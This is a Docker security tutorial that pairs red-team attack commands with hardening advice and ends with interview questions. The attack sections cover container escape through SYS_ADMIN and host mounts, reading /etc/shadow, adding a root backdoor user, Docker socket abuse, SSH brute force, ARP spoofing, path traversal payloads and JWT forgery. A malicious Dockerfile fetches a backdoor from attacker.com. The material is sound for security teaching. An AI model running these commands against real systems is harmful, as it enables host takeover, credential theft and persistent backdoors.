# 🔴 Red Team Attacks: Docker Security Exploitation & Defense

## 🎯 Understanding Red Team Docker Security

Red team security testing involves simulating real-world attacks against Docker containers to identify vulnerabilities, test security controls, and validate defense mechanisms. This section covers attack scenarios, exploitation techniques, and security edge cases.

## ⚠️ **DISCLAIMER: Educational Purpose Only**
```bash
# This content is for:
- Security research and education
- Penetration testing with proper authorization
- Improving container security defenses
- Interview preparation and skill development

# NOT for:
- Unauthorized attacks
- Malicious activities
- Production environment exploitation
- Illegal activities
```

## 🚨 Container Escape Attack Scenarios

### **1. Privilege Escalation via Capabilities**

#### **Attack Vector: SYS_ADMIN Capability**
```bash
# Attacker gains shell in container
docker exec -it vulnerable-container /bin/bash

# Check current capabilities
cat /proc/1/status | grep CapEff

# If SYS_ADMIN capability is present:
# Mount host filesystem
mount /dev/sda1 /mnt/host
cd /mnt/host
ls -la /etc/passwd

# Access host files
cat /mnt/host/etc/shadow
cat /mnt/host/etc/ssh/sshd_config

# Create backdoor user
echo "backdoor:$(openssl passwd -1 password):0:0::/root:/bin/bash" >> /mnt/host/etc/passwd
```

#### **Exploitation Steps**
```bash
# 1. Identify vulnerable container
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"

# 2. Gain shell access
docker exec -it container_name /bin/bash

# 3. Check capabilities
cat /proc/1/status | grep CapEff

# 4. Exploit SYS_ADMIN capability
mount /dev/sda1 /mnt/host
cd /mnt/host

# 5. Access host resources
ls -la /root/
cat /etc/shadow
```

#### **Defense & Patching**
```bash
# Remove dangerous capabilities
docker run -d --name secure-app \
  --cap-drop SYS_ADMIN \
  --cap-drop SYS_MODULE \
  --cap-drop SYS_RAWIO \
  myapp:latest

# Use security profiles
docker run -d --name secure-app \
  --security-opt apparmor=docker-default \
  --security-opt seccomp=default \
  myapp:latest

# Run as non-root user
docker run -d --name secure-app \
  --user 1000:1000 \
  myapp:latest
```

### **2. Container Escape via Mount Points**

#### **Attack Vector: Host Volume Mounts**
```bash
# Vulnerable container with host mount
docker run -d --name vulnerable-app \
  -v /:/host \
  -v /var/run/docker.sock:/var/run/docker.sock \
  myapp:latest

# Attacker gains shell and escapes
docker exec -it vulnerable-app /bin/bash

# Access host filesystem
cd /host
ls -la /root/
cat /etc/shadow

# Access Docker socket
cd /host/var/run
ls -la docker.sock

# Create new privileged container
docker run -it --privileged -v /:/host alpine:latest
```

#### **Exploitation Techniques**
```bash
# Method 1: Direct host access
cd /host
cat /etc/passwd
cat /etc/shadow

# Method 2: Docker socket abuse
cd /host/var/run
docker run -it --privileged -v /:/host alpine:latest

# Method 3: Process injection
cd /host/proc
ls -la /host/proc/1/exe
```

#### **Defense & Patching**
```bash
# Avoid host mounts
docker run -d --name secure-app \
  -v app-data:/app/data \
  myapp:latest

# Use read-only mounts
docker run -d --name secure-app \
  --read-only \
  --tmpfs /tmp \
  --tmpfs /var/log \
  myapp:latest

# Restrict Docker socket access
chmod 660 /var/run/docker.sock
chown root:docker /var/run/docker.sock
```

### **3. Kernel Exploitation via Shared Namespace**

#### **Attack Vector: Host Network Namespace**
```bash
# Container with host network
docker run -d --name vulnerable-app \
  --network host \
  myapp:latest

# Attacker gains shell
docker exec -it vulnerable-app /bin/bash

# Access host network interfaces
ip addr show
netstat -tuln

# Scan host network
nmap -sS 127.0.0.1
nmap -sS 192.168.1.0/24

# Access host processes
ps aux
```

#### **Exploitation Steps**
```bash
# 1. Identify host network containers
docker ps --format "table {{.Names}}\t{{.NetworkMode}}"

# 2. Gain shell access
docker exec -it container_name /bin/bash

# 3. Reconnaissance
ip addr show
netstat -tuln
ps aux

# 4. Network scanning
nmap -sS 127.0.0.1
nmap -sS 192.168.1.0/24

# 5. Process enumeration
ps aux | grep -E "(ssh|mysql|postgres|redis)"
```

#### **Defense & Patching**
```bash
# Use bridge networking
docker run -d --name secure-app \
  --network bridge \
  -p 8080:8080 \
  myapp:latest

# Create isolated networks
docker network create --internal secure-backend
docker run -d --name secure-app \
  --network secure-backend \
  myapp:latest

# Network segmentation
docker network create dmz
docker network create internal
```

## 🌐 Network-Based Attack Scenarios

### **1. Port Scanning & Service Enumeration**

#### **Attack Vector: Exposed Services**
```bash
# Vulnerable container with exposed ports
docker run -d --name vulnerable-app \
  -p 0.0.0.0:8080:8080 \
  -p 0.0.0.0:22:22 \
  -p 0.0.0.0:3306:3306 \
  myapp:latest

# Attacker scans for services
nmap -sS -p- 192.168.1.100
nmap -sS -sV -p 22,80,443,3306,8080 192.168.1.100

# Service enumeration
nmap --script=banner -p 22,80,443,3306,8080 192.168.1.100
```

#### **Exploitation Techniques**
```bash
# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Web application testing
dirb http://192.168.1.100:8080
nikto -h http://192.168.1.100:8080

# Database testing
mysql -h 192.168.1.100 -u root -p
```

#### **Defense & Patching**
```bash
# Bind to localhost only
docker run -d --name secure-app \
  -p 127.0.0.1:8080:8080 \
  myapp:latest

# Use reverse proxy
docker run -d --name nginx-proxy \
  -p 80:80 \
  -v /etc/nginx/nginx.conf:/etc/nginx/nginx.conf \
  nginx:alpine

# Firewall rules
sudo iptables -I DOCKER-USER -s 0.0.0.0/0 -d 192.168.1.100 -j DROP
```

### **2. Man-in-the-Middle Attacks**

#### **Attack Vector: ARP Spoofing**
```bash
# Attacker on same network
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Sniff traffic
tcpdump -i eth0 -w captured.pcap
```

#### **Exploitation Steps**
```bash
# 1. Network reconnaissance
arp -a
netstat -rn

# 2. Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# 3. ARP spoofing
arpspoof -i eth0 -t target_ip gateway_ip

# 4. Traffic interception
tcpdump -i eth0 -w captured.pcap
wireshark captured.pcap
```

#### **Defense & Patching**
```bash
# Use encrypted communication
docker run -d --name secure-app \
  -e SSL_CERT=/etc/ssl/certs/cert.pem \
  -e SSL_KEY=/etc/ssl/private/key.pem \
  myapp:latest

# Network segmentation
docker network create --internal secure-backend
docker run -d --name secure-app \
  --network secure-backend \
  myapp:latest

# ARP monitoring
arpwatch -i eth0
```

## 💾 File System Attack Scenarios

### **1. Path Traversal Attacks**

#### **Attack Vector: Directory Traversal**
```bash
# Vulnerable application
docker run -d --name vulnerable-app \
  -v /app/uploads:/app/uploads \
  myapp:latest

# Attacker uploads malicious file
curl -X POST -F "file=@../../../etc/passwd" \
  http://192.168.1.100:8080/upload

# Access sensitive files
curl http://192.168.1.100:8080/download?file=../../../etc/shadow
```

#### **Exploitation Techniques**
```bash
# Path traversal payloads
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Directory listing
curl http://192.168.1.100:8080/list?dir=../../../

# File inclusion
curl http://192.168.1.100:8080/include?file=../../../etc/passwd
```

#### **Defense & Patching**
```bash
# Input validation
import os
import pathlib

def safe_path(base_path, user_path):
    base = pathlib.Path(base_path).resolve()
    user = pathlib.Path(user_path).resolve()
    try:
        user.relative_to(base)
        return str(user)
    except ValueError:
        raise ValueError("Path traversal detected")

# Use chroot
docker run -d --name secure-app \
  --security-opt apparmor=docker-default \
  myapp:latest
```

### **2. Symlink Attacks**

#### **Attack Vector: Symbolic Link Exploitation**
```bash
# Attacker creates malicious symlink
ln -s /etc/passwd /tmp/innocent.txt

# Uploads file to container
curl -X POST -F "file=@/tmp/innocent.txt" \
  http://192.168.1.100:8080/upload

# Container processes the symlink
cat /app/uploads/innocent.txt
# Actually reads /etc/passwd
```

#### **Exploitation Steps**
```bash
# 1. Create malicious symlink
ln -s /etc/shadow /tmp/config.txt
ln -s /root/.ssh/id_rsa /tmp/key.txt

# 2. Upload to container
curl -X POST -F "file=@/tmp/config.txt" \
  http://192.168.1.100:8080/upload

# 3. Access sensitive data
curl http://192.168.1.100:8080/download?file=config.txt
```

#### **Defense & Patching**
```bash
# Follow symlinks safely
import os

def safe_read_file(file_path):
    if os.path.islink(file_path):
        real_path = os.path.realpath(file_path)
        if not real_path.startswith('/app/'):
            raise ValueError("Symlink attack detected")
    return open(file_path).read()

# Use read-only filesystem
docker run -d --name secure-app \
  --read-only \
  --tmpfs /tmp \
  myapp:latest
```

## 🔐 Authentication & Authorization Attacks

### **1. JWT Token Attacks**

#### **Attack Vector: Weak JWT Implementation**
```bash
# Vulnerable JWT implementation
docker run -d --name vulnerable-app \
  -e JWT_SECRET=weak_secret \
  myapp:latest

# Attacker decodes JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d

# Brute force JWT secret
hashcat -m 16500 -a 0 jwt.txt wordlist.txt

# Create forged token
python3 -c "
import jwt
payload = {'user_id': 1, 'role': 'admin'}
token = jwt.encode(payload, 'weak_secret', algorithm='HS256')
print(token)
"
```

#### **Exploitation Techniques**
```bash
# 1. JWT token analysis
echo "token" | base64 -d | jq .

# 2. Algorithm confusion
# Change alg from RS256 to HS256
# Use public key as secret

# 3. None algorithm
# Set alg to 'none' and remove signature

# 4. Weak secret brute force
hashcat -m 16500 -a 0 jwt.txt wordlist.txt
```

#### **Defense & Patching**
```bash
# Strong JWT implementation
import jwt
import secrets

# Generate strong secret
secret = secrets.token_urlsafe(32)

# Verify algorithm
def verify_token(token):
    try:
        payload = jwt.decode(token, secret, algorithms=['HS256'])
        return payload
    except jwt.InvalidTokenError:
        return None

# Use secure JWT library
pip install PyJWT[crypto]
```

### **2. Session Hijacking**

#### **Attack Vector: Predictable Session IDs**
```bash
# Vulnerable session implementation
docker run -d --name vulnerable-app \
  -e SESSION_SECRET=123456 \
  myapp:latest

# Attacker predicts session ID
for i in {1..1000}; do
  curl -H "Cookie: session=$i" \
    http://192.168.1.100:8080/admin
done
```

#### **Exploitation Steps**
```bash
# 1. Session enumeration
for i in {1..1000}; do
  curl -H "Cookie: session=$i" \
    http://192.168.1.100:8080/admin
done

# 2. Session fixation
curl -c cookies.txt http://192.168.1.100:8080/login
curl -b cookies.txt http://192.168.1.100:8080/admin

# 3. Session replay
curl -H "Cookie: session=stolen_session_id" \
  http://192.168.1.100:8080/admin
```

#### **Defense & Patching**
```bash
# Secure session management
import secrets
import hashlib

# Generate random session ID
session_id = secrets.token_urlsafe(32)

# Hash session ID
hashed_session = hashlib.sha256(session_id.encode()).hexdigest()

# Session timeout
import time
session_timeout = 3600  # 1 hour
if time.time() - session_created > session_timeout:
    invalidate_session()
```

## 🚨 Advanced Attack Scenarios

### **1. Container Escape via Kernel Exploits**

#### **Attack Vector: Kernel Vulnerability Exploitation**
```bash
# Check kernel version
uname -r

# Known vulnerable kernels
# Linux 4.4.0-116-generic (CVE-2017-1000112)
# Linux 4.8.0-34-generic (CVE-2016-5195)

# Exploit development
gcc -o exploit exploit.c
./exploit

# Gain root access
whoami
id
```

#### **Exploitation Steps**
```bash
# 1. Kernel version enumeration
uname -r
cat /proc/version

# 2. Check for known exploits
searchsploit kernel 4.4.0
searchsploit CVE-2017-1000112

# 3. Compile and run exploit
gcc -o exploit exploit.c
chmod +x exploit
./exploit

# 4. Verify privilege escalation
whoami
id
cat /etc/shadow
```

#### **Defense & Patching**
```bash
# Keep kernel updated
apt-get update && apt-get upgrade -y

# Use security profiles
docker run -d --name secure-app \
  --security-opt apparmor=docker-default \
  --security-opt seccomp=default \
  myapp:latest

# Monitor for kernel exploits
# Use tools like Lynis, OpenSCAP
```

### **2. Supply Chain Attacks**

#### **Attack Vector: Malicious Base Images**
```bash
# Attacker creates malicious image
FROM alpine:latest
RUN echo "malicious_user:$(openssl passwd -1 password):0:0::/root:/bin/bash" >> /etc/passwd
RUN echo "malicious_user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
RUN wget http://attacker.com/backdoor -O /usr/bin/backdoor
RUN chmod +x /usr/bin/backdoor

# Push to public registry
docker tag malicious-image:latest username/malicious-image:latest
docker push username/malicious-image:latest
```

#### **Exploitation Techniques**
```bash
# 1. Image analysis
docker pull username/malicious-image:latest
docker run -it username/malicious-image:latest /bin/sh

# 2. Check for backdoors
ls -la /usr/bin/backdoor
cat /etc/passwd | grep malicious_user
cat /etc/sudoers | grep malicious_user

# 3. Execute backdoor
/usr/bin/backdoor
```

#### **Defense & Patching**
```bash
# Image scanning
trivy image username/malicious-image:latest
docker scan username/malicious-image:latest

# Content trust
export DOCKER_CONTENT_TRUST=1
docker pull username/malicious-image:latest

# Base image verification
docker inspect username/malicious-image:latest
docker history username/malicious-image:latest

# Use official images only
FROM node:16-alpine
# Instead of FROM username/custom-node:latest
```

## 🛡️ Defense & Hardening Techniques

### **1. Container Hardening**

#### **Security Configuration**
```bash
# Secure container run
docker run -d --name secure-app \
  --read-only \
  --cap-drop ALL \
  --security-opt apparmor=docker-default \
  --security-opt seccomp=default \
  --user 1000:1000 \
  --pids-limit 100 \
  --memory 512m \
  --cpus 0.5 \
  --tmpfs /tmp \
  --tmpfs /var/log \
  myapp:latest
```

#### **Security Profiles**
```bash
# Custom AppArmor profile
# /etc/apparmor.d/docker-app
#include <tunables/global>

profile docker-app flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  
  # Application files
  /app/** r,
  /app/bin/** rx,
  
  # Temporary directories
  /tmp/** rw,
  /var/tmp/** rw,
  
  # Logging
  /var/log/** rw,
  
  # Network
  network,
  
  # Deny dangerous operations
  deny /proc/sys/** w,
  deny /sys/** w,
  deny /dev/** w,
}
```

### **2. Network Security**

#### **Network Segmentation**
```bash
# Create security zones
docker network create --internal secure-backend
docker network create dmz
docker network create public

# Place containers in appropriate zones
docker run -d --name db --network secure-backend postgres:13
docker run -d --name api --network dmz myapi:latest
docker run -d --name web -p 80:80 --network public nginx:latest

# Firewall rules
sudo iptables -I DOCKER-USER -s 172.17.0.0/16 -d 192.168.1.0/24 -j DROP
sudo iptables -I DOCKER-USER -p tcp --dport 22 -j DROP
```

#### **Encrypted Communication**
```bash
# TLS/SSL configuration
docker run -d --name secure-app \
  -v /etc/ssl/certs:/etc/ssl/certs \
  -v /etc/ssl/private:/etc/ssl/private \
  -e SSL_CERT=/etc/ssl/certs/cert.pem \
  -e SSL_KEY=/etc/ssl/private/key.pem \
  myapp:latest

# Certificate management
# Use Let's Encrypt for free certificates
# Implement certificate rotation
# Monitor certificate expiration
```

### **3. Monitoring & Detection**

#### **Security Monitoring**
```bash
# Runtime monitoring
docker stats container_name
docker logs -f container_name

# Process monitoring
docker exec container_name ps aux
docker exec container_name pstree

# Network monitoring
docker exec container_name netstat -tuln
docker exec container_name ss -tuln

# File system monitoring
docker exec container_name find /tmp -type f -newer /tmp/reference
```

#### **Anomaly Detection**
```bash
#!/bin/bash
# security-monitor.sh

CONTAINER_NAME=$1
LOG_FILE="/var/log/security-events.log"

# Monitor for privilege escalation
docker exec $CONTAINER_NAME id | grep -q "uid=0" && \
echo "$(date): Root access detected in $CONTAINER_NAME" >> $LOG_FILE

# Monitor for new processes
docker exec $CONTAINER_NAME ps aux | grep -v -E "(PID|ps|grep)" && \
echo "$(date): New process detected in $CONTAINER_NAME" >> $LOG_FILE

# Monitor for network changes
docker exec $CONTAINER_NAME netstat -tuln | grep -E ":(22|3306|5432)" && \
echo "$(date): Suspicious network activity in $CONTAINER_NAME" >> $LOG_FILE
```

## 📊 Attack Simulation & Testing

### **1. Penetration Testing Framework**

#### **Testing Methodology**
```bash
# 1. Reconnaissance
# - Port scanning
# - Service enumeration
# - Version detection

# 2. Vulnerability Assessment
# - Vulnerability scanning
# - Configuration review
# - Code analysis

# 3. Exploitation
# - Proof of concept
# - Privilege escalation
# - Data exfiltration

# 4. Post-exploitation
# - Persistence
# - Lateral movement
# - Data collection

# 5. Reporting
# - Executive summary
# - Technical details
# - Remediation steps
```

#### **Testing Tools**
```bash
# Network scanning
nmap -sS -sV -p- target_ip
masscan -p1-65535 target_ip

# Web application testing
dirb http://target_ip
nikto -h http://target_ip
sqlmap -u "http://target_ip/page?id=1"

# Container testing
trivy image target_image
docker scan target_image
anchore-cli image add target_image

# Exploitation frameworks
metasploit-framework
exploit-db
searchsploit
```

### **2. Red Team Exercises**

#### **Exercise Scenarios**
```bash
# Scenario 1: Container Escape
# - Gain shell in container
# - Exploit capabilities
# - Escape to host
# - Access sensitive data

# Scenario 2: Network Pivot
# - Compromise web container
# - Exploit database container
# - Access internal network
# - Exfiltrate data

# Scenario 3: Supply Chain
# - Compromise build process
# - Inject malicious code
# - Deploy backdoor
# - Maintain persistence
```

#### **Exercise Execution**
```bash
# 1. Planning
# - Define objectives
# - Identify targets
# - Plan attack vectors
# - Set success criteria

# 2. Execution
# - Execute attack plan
# - Document findings
# - Adapt to defenses
# - Achieve objectives

# 3. Analysis
# - Review results
# - Identify gaps
# - Document lessons
# - Plan improvements
```

## 🎯 Interview Preparation

### **1. Common Interview Questions**

#### **Technical Questions**
```bash
# Q: How would you escape from a Docker container?
# A: Check for capabilities, mount points, shared namespaces

# Q: What are the most dangerous Docker capabilities?
# A: SYS_ADMIN, SYS_MODULE, SYS_RAWIO, NET_ADMIN

# Q: How would you detect a container escape?
# A: Monitor processes, network activity, file system changes

# Q: What's the difference between containers and VMs?
# A: Shared kernel vs isolated kernel, attack surface

# Q: How would you secure a Docker daemon?
# A: TLS, user namespace, security profiles, monitoring
```

#### **Scenario-Based Questions**
```bash
# Q: You find a container running as root, what do you do?
# A: Document, isolate, investigate, remediate, monitor

# Q: How would you respond to a container breach?
# A: Stop, isolate, investigate, remediate, report, learn

# Q: What's your approach to container security testing?
# A: Reconnaissance, assessment, exploitation, reporting

# Q: How do you stay current with container threats?
# A: Research, conferences, communities, practice
```

### **2. Practical Demonstrations**

#### **Live Exploitation Demo**
```bash
# 1. Set up vulnerable environment
docker run -d --name vulnerable-app \
  --cap-add SYS_ADMIN \
  -v /:/host \
  alpine:latest

# 2. Demonstrate attack
docker exec -it vulnerable-app /bin/sh
mount /dev/sda1 /mnt/host
cd /mnt/host
cat /etc/shadow

# 3. Show defense
docker stop vulnerable-app
docker rm vulnerable-app

# 4. Deploy secure version
docker run -d --name secure-app \
  --cap-drop ALL \
  --read-only \
  alpine:latest
```

#### **Security Tool Demo**
```bash
# 1. Vulnerability scanning
trivy image vulnerable-image:latest

# 2. Runtime monitoring
docker stats container_name
docker logs -f container_name

# 3. Security profiles
docker run --security-opt apparmor=my-profile myapp

# 4. Compliance checking
./compliance-check.sh myapp:latest
```

## 🚀 Next Steps

Now that you understand red team attacks, let's explore:

1. **Blue Team Defense** - Building robust security controls
2. **Incident Response** - Handling security breaches
3. **Threat Hunting** - Proactive threat detection
4. **Security Automation** - Automating security processes

---

*Red team security testing is essential for understanding attack vectors and improving defenses. Always conduct testing with proper authorization and in controlled environments.* 